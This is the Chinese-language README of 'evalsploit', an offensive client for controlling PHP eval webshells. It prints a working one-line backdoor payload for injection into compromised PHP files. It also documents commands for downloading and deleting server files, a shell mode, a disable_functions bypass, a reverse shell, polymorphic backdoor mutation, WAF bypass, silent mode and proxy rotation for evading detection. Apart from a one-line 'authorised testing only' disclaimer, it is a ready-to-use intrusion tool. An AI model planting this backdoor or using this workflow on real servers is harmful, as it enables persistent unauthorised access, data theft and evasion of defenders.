# evalsploit 3.0

基于 **eval 的 PHP 后门客户端**，用于红队与渗透测试。在禁用 `exec()` 和 shell 的受限环境中运行：所有文件操作仅使用 PHP 内置函数（fopen、DirectoryIterator、copy、unlink 等）。

- **单行载荷** - 可注入受感染 PHP 文件的任何执行位置，或作为独立 shell 使用。
- **会话文件** - 保存和加载连接（URL + 密钥 Z、V），便于快速重连。
- **变异** - 在受感染文件中将后门行替换为新的多态载荷，并切换客户端到新密钥。
- **静默模式** - 连接时不请求标识（pwd、ping），在首次命令前保持最少流量。
- **代理** - host:port 列表、校验、每会话一个代理（随机或按序号），无需返回菜单即可切换。
- **插件** - 无需修改核心即可添加自定义命令（见「插件」一节）。

**文档语言：** [Русский (主要)](README_RU.md) | [English](README.md) | **中文**

---

## 安装

```bash
cd evalsploit
pip install -e .
# 或
pip install -r requirements.txt
```

数据（会话、设置、useragents）存放在 `data/` 下。如需要可将 `evalsploit-main/useragents` 复制到 `data/useragents`。

---

## 运行

```bash
python -m evalsploit
# 或
evalsploit
```

启动时可：输入**会话名**（来自 `data/sessions/`）、输入**新 URL**，或留空以使用 `data/settings.ini` 中的上次连接。

---

## 载荷

将载荷作为任意执行 PHP 代码中的单行使用，或作为独立文件：

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

更改发送模式或使用自定义参数名后，运行 **gen** 获取对应载荷（并在会话或设置中使用相同的 Z、V）。

---

## 发送模式 (send)

| 模式       | 说明 |
|------------|------|
| **bypass** | 载荷 base64 编码，用分隔符分块；参数 Z 和 V。可绕过部分 WAF/过滤。 |
| **classic** | 载荷 base64 放在参数 Z 中。 |
| **simple**  | 原始 PHP 放在参数 Z 中（无标记解析，用于调试）。 |

连接时（若未开启 **silent**）客户端会依次尝试各模式并保存可用者。手动设置：`set send bypass|classic|simple`。

---

## 命令

支持路径中含空格：两条路径时使用分隔符 ` : `（cp、ren/mv、带远程路径的 upload）。

| 命令       | 说明 |
|------------|------|
| **ls**, **dir** | 列出目录（样式：`set ls ls` 或 `set ls dir`） |
| **cd**, **pwd**, **home** | 切换目录、显示当前路径、转到 __DIR__ |
| **cat**    | 显示文件（样式：`set cat bcat` / `set cat cat`） |
| **cp**     | 复制：`cp <源> : <目标>`（分隔符 ` : `；两路径可含空格） |
| **rm**, **del** | 删除文件：`rm <path>` 或 `del <path>`（set confirm 1 时需确认） |
| **ren**, **mv** | 重命名/移动：`ren <旧> : <新>` |
| **download**, **get**, **dl** | 从服务器下载：`download <远程路径>` 或 `download <远程路径> : <本地路径>`（无第二参数则保存到 data/downloads；带 ` : ` 则保存到指定文件或目录；路径可含空格） |
| **upload**, **put**, **upl** | 上传：`upload <本地路径>` 或 `upload <本地路径> : <远程路径>`（可选远程路径用 ` : `；两路径可含空格） |
| **mkdir**, **mkd**, **md** | 创建目录 |
| **create**, **mkf** | 创建空文件 |
| **touch**, **stat** | 更新时间/创建空文件；文件/目录信息 |
| **edit**   | 下载 → 本地编辑 → 上传 |
| **run**    | Shell 模式（exec/shell_exec/…）- 输入 `exit` 退出 |
| **exploit** | 绕过 disable_functions（如 7.3–8.1） |
| **scan**   | 递归扫描，报告在 report/ |
| **reverse** | 反向 shell：`reverse <主机>:<端口>` |
| **set**    | 设置：`set <模块> <值>` 或 `set <模块> help`（含 set proxy 0/1） |
| **proxy_switch** | 更换当前代理：无参数（新随机）、N（第 N 个）、random |
| **gen**, **generate** | 为当前 send 模式及 Z、V 生成载荷 |
| **mutate** | 在服务器上用新多态载荷替换后门行；更新本地 Z、V |
| **sessions**, **saved** | 已保存会话列表 |
| **save** \<名称\> | 将当前连接保存为会话 |
| **connect** \<名称\> | 切换到已保存会话 |
| **config** | 显示当前设置 |
| **info**   | 服务器信息（PHP、OS 等） |
| **ping**, **check** | 连通性与延迟检测 |
| **php**    | PHP 控制台：输入代码并发送到服务器 |
| **try**, **detect** | 检查可用执行方式（如 `try run`） |
| **menu**   | 返回主启动菜单（当前会话结束；会提示确认） |
| **help**, **exit** | 帮助；退出（退出程序前会提示确认） |

---

## 会话文件

存放在 `data/sessions/`，格式为 \<名称\>.ini：

```ini
[SESSION]
url = https://target.com/shell.php
Z = mg1qjg
V = 3I15EA
send_mode = bypass
silent = 0
```

URL 和密钥（Z、V）必填。**save \<名称\>** 创建会话；**connect \<名称\>** 加载。**silent** 会写入会话文件，加载会话时生效。

---

## 静默模式 (silent)

**set silent 1** 时，连接阶段不执行：
- 当前目录请求（pwd）；
- 后门可达性检测（ping）及发送模式回退。

命令照常发送；可用 **pwd** 或 **cwd**（插件）获取当前路径。用于在运行命令前最小化流量。设置会保存到全局配置和会话文件。

---

## 代理 (Proxies)

**启动菜单**中选项 **5. 代理** - 子菜单：从文件加载列表（`data/proxies.txt` 或自定义路径）、校验每个代理（经代理 GET）、带 OK 状态的列表、启用/禁用、选择模式 - **random**（默认；每会话一个随机代理）或按序号。列表保存在 `data/proxies.txt`（一行一个 `host:port`，空行和 `#` 行忽略）。校验通过的序号仅保存在内存中，重启后需重新校验。

**连接后：** **set proxy 0** - 关闭，**set proxy 1** - 开启。**set proxy show** - 显示校验过的代理并按编号选择。**set proxy switch** - 另选一个随机代理（排除当前）。**set proxy switch N** - 切换到第 N 个代理。**set proxy switch random** - random 模式，下次请求用新随机代理。也可使用 **proxy_switch**（别名）。所选代理用于所有请求直至切换或关闭。

---

## 设置 (set)

- **set run** - run 使用的 shell 函数（exec、shell_exec、system、passthru、popen、proc_open、expect_popen、pcntl_exec、do）。
- **set ls** / **set cat** - 列表与读取样式（选项见 snippets.ini）。
- **set send** - 发送模式：bypass、classic、simple。
- **set silent** - 0 或 1。
- **set reverse** - 反向 shell 类型：ivan、monkey。
- **set confirm** - 危险操作（rm、upl、edit）前确认：0 或 1。
- **set rm**, **set del**, **set download**, **set upload**, **set rename**, **set stat**, **set touch**, **set create**, **set mkdir**, **set cp** - 各命令的代码片段选择（键来自 snippets.ini）。别名（dl、get、upl、put、mkf、mkd、md、ren、mv）均可使用。

---

## 插件

插件在不修改 evalsploit 核心的情况下增加新命令。

### 工作原理

启动时 evalsploit 加载 `evalsploit/plugins/` 下所有 `*.py`（以 `_` 开头的文件跳过）。每个插件须用 `@register` 注册命令，并实现继承 `Module` 的类及 `run(ctx, args)` 方法。

- **ctx**（SessionContext）：`ctx.send(php)` 向服务器发送 PHP，`ctx.config`、`ctx.pwd`、`ctx.resolve_path(path)`、`ctx.file_exists(path)`、`ctx.url`、`ctx.uagent` 等。
- **args** - 用户输入中命令名后的全部内容（参数解析在插件内完成）。

可在 `@register` 中可选传入 **description** 和 **usage**，会出现在 **help** 中。

### 最简插件示例

创建 `evalsploit/plugins/mycmd.py`：

```python
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

@register("mycmd", description="简短说明", usage="mycmd [path]")
class MyCmdModule(Module):
    def run(self, ctx, args):
        path = ctx.resolve_path(args.strip()) if args.strip() else ctx.pwd
        php = "echo getcwd();"
        print(ctx.send(php).strip())
        return None
```

下次运行后，**mycmd** 会出现在命令列表和 **help** 中。

### 建议

- 一个文件对应一条命令（命令名在 `@register` 中指定）。
- 导入：`register` 来自 `evalsploit.modules.registry`，`Module` 来自 `evalsploit.modules.base`。在 PHP 字符串中嵌入路径时使用 `evalsploit.modules.base` 的 `php_quote()`。
- 处理异常并输出用户可读信息；避免未捕获崩溃。
- 危险操作可使用 `evalsploit.modules.base` 的 `confirm_dangerous(ctx, action, detail)`。

更多见 [evalsploit/plugins/README.md](evalsploit/plugins/README.md) 及示例 `example_echo.py`、`example_cwd.py`。

---

## 代码片段 (Snippets)

文件类命令（ls、cat、rm、dl、upload、touch、stat 等）使用 `evalsploit/modules/snippets/` 中的 PHP 片段。索引在 `snippets.ini`。用 **set** \<命令\> \<键\> 选择变体。settings.ini 中的键在加载时校验；无效键会重置并输出 stderr 警告。

---

## 变异 (Mutation)

**mutate** 生成新的多态后门（新 Z、V），发送 PHP 读取当前脚本，找到当前触发行（`isset($_POST['Z'])`），替换为新后门并写回文件。客户端更新其 Z、V。其他后门副本（其他 URL）仍使用旧密钥，直至手动更新或在该处执行 mutate。

---

## 架构

- **config** - 全局设置、会话加载/保存、片段键校验。
- **context** - URL、pwd、user-agent、`send(php)`、路径辅助（`resolve_path`、`file_exists`）。
- **transport** - 载荷编码（bypass/classic/simple）、POST、按标记解析响应（标记前输出被忽略）。
- **payloads** - 单行、多态后门、变异用 PHP。
- **modules** - 每条命令为已注册模块；文件操作使用 `evalsploit/modules/snippets/` 中的片段。

添加核心模块：实现 `run(ctx, args)`，使用 `@register("cmdname")`，如需则在 `snippets/` 添加片段。向片段代入路径时使用 `php_quote(value)`。

---

## 更新说明（相对早期 evalsploit）

### 新增与改进

- **menu** - 从会话循环返回主启动菜单；会提示确认，当前会话显式结束。**exit** 现在也会在退出进程前请求确认。
- **命令名与别名** - 更直观的主名与向后兼容别名：
  - **mkdir**（别名：mkd、md）- 创建目录  
  - **create**（别名：mkf）- 创建空文件  
  - **download**（别名：get、dl）- 从服务器下载；可选 `download <远程> : <本地>` 保存到指定文件或目录（无第二参数则保存到 data/downloads）。  
  - **upload**（别名：put、upl）- 上传；可选远程路径用分隔符 ` : `  
  - **ren**（别名：mv）- 重命名/移动  
  - **gen**（别名：generate）、**try**（别名：detect）、**rm**（别名：del）
- **路径含空格** - 双路径命令使用 ` : ` 分隔（cp、ren/mv、upload）。单路径命令（download、get、dl、rm、cat、cd 等）整行视为一条路径，支持空格。**upload** 改为用 ` : ` 表示可选远程路径，以便两路径均可含空格。
- **帮助 (usage)** - HELP_TEXTS 与应用内 help 已标明正确用法，如 `cp <from> : <to>`、`download <remote_path>`、`upload <local_path> [ : <remote_path>]`。
- **set** - 接受所有新名称与别名用于片段选择（mkdir、create、download、upload、del、ren、mv 等）。

### 不兼容/行为变更

- **upload** - 两条路径必须用 ` : ` 分隔。旧写法 `upload <本地> <远程>`（两词用空格）不再支持；请用 `upload <本地> : <远程>` 以支持路径含空格。
- **exit** - 退出程序前需确认（y/yes）；EOF（如 Ctrl+Z/D）仍会直接退出且不提示。

---

## 与同类工具对比

### Weevely

Weevely 使用自有载荷格式与协议（referrer/cookie、加密）。evalsploit 采用单一简单 eval 单行、服务器端痕迹最小，可配置密钥（Z、V）与发送模式（bypass/classic/simple），就地变异（替换一行），文件操作仅用 PHP 内置（无需 exec/shell）。Python 插件可增加命令而无需重新构建。

### PhpSploit

PhpSploit 为完整 C2 框架，基于 HTTP 头隧道与大量插件。evalsploit 侧重简洁：单行 eval、POST 参数（Z、V）、响应标记便于调试。会话为普通 .ini（url、Z、V、send_mode、silent）。静默模式减少连接时流量。片段键在加载时校验。插件集中于一目录，扩展功能无需改动核心。

### evalsploit 的优势

- 载荷极小 - 单行 eval，易于注入。
- 无需 exec/shell - 仅用 PHP 内置（适合 disable_functions）。
- 密钥与发送模式灵活，就地变异。
- 会话与静默模式便于快速重连与低特征。
- 插件 - 在 plugins/ 中一个 .py 即可新增命令。
- 架构简单 - 便于调试与扩展。

---

## 许可与使用

仅用于经授权的安全测试与研究。
